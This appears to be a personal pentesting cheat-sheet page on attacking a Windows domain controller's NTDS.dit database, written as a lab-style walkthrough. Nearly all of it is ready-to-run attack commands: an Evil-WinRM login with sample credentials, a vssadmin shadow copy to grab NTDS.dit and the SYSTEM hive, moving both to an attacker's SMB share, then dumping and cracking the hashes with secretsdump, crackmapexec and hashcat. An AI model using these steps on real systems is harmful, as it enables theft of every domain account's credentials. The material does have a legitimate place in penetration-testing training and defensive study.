---
title: Attacking NTDS
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
---
# Attacking NTDS

By default, the NTDS file (NTDS.dit) is located in `%SystemRoot%\NTDS\Ntds.dit` of a domain controller. The .dit stands for directory information tree. 

## Alternative #1

**1.** Connecting to a DC with Evil-WinRM

```shell-session
evil-winrm -i $DomainControllerIP  -u $username -p $password
# Example:
# evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

**2.** Checking Local Group Membership

```shell-session
net localgroup
```

**3.** Checking User Account Privileges including Domain

```shell-session
net user $username
# Example: 
# net user bwilliamson
```

**4.** Creating Shadow Copy of C: We can use vssadmin to create a Volume Shadow Copy (VSS) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install.

```shell-session
vssadmin CREATE SHADOW /For=C:
```

Results:

```
Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

**5.** Copying NTDS.dit from the VSS: We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.

```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

**6.** We will also need either the SYSTEM hive or bootkey is required for local parsing. So let's save the system hive

```cmd
reg.exe save hklm\system C:\system.save
```

**7.** Transfer file to attacking machine. For instance, with [smbserver.py from impacket](smbserver.md).

```bash
# From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct
#########################################
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

# From the victim's machine (windows)
#########################################
# If you are from powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\$ipAttacker\CompData
cmd.exe /c move system.save \\$ipAttacker\CompData

# If you have a cmd terminal
move C:\NTDS\NTDS.dit \\$ipAttacker\CompData
move system.save \\$ipAttacker\CompData

```

**8.** Extract and crack ntds.dit locally:

```bash
python ~/tools/impacket/examples/secretsdump.py -ntds ~/borrar/NTDS.dit  -system ~/borrar/system.save -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```


## Alternative #2 

```shell-session
crackmapexec smb $ip -u $username -p $password --ntds
# Example: 
# crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

Cracking a Single Hash with Hashcat

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Cracking ntds file

We will need either the SYSTEM hive or bootkey:

```bash
python3 /opt/impacket/examples/secretsdump.py -ntds ~/borrar/ntds.dit -system ~/Extract/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract

python3 /opt/impacket/examples/secretsdump.py -ntds ~/borrar/ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```

